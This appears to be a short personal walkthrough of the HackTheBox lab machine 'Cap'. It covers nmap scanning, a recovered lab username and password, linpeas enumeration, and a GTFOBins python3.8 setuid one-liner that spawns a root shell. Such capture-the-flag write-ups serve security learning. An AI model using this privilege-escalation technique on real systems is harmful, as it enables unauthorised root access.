Let's do the default steps:
`nmap 10.10.10.245  -Pn -A` and add `10.10.10.245 cap.htb` to `/etc/hosts`




![[Pasted image 20250428185603.png]]
![[Pasted image 20250428185615.png]]

`PASS Buck3tH4TF0RM3!` 
`USER nathan`

There a thing called `linpeash.sh` we run to scan the whole machine for any vulnerabilities. It gives a bunch of CVEs.
![[Pasted image 20250428194304.png]]

One peculiar thing is the `python3.8` executable has the capability to do `setuid` for users to run programs.

Now, there is this site called https://gtfobins.github.io/. Look at python's exploit and it says when the cap bit us set we can run below code and get a root shell!
`python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'`

Voila! Now, we simply get the flag from `/root/root.txt` and treat yourself to a fresh crisp glass of god's necter!


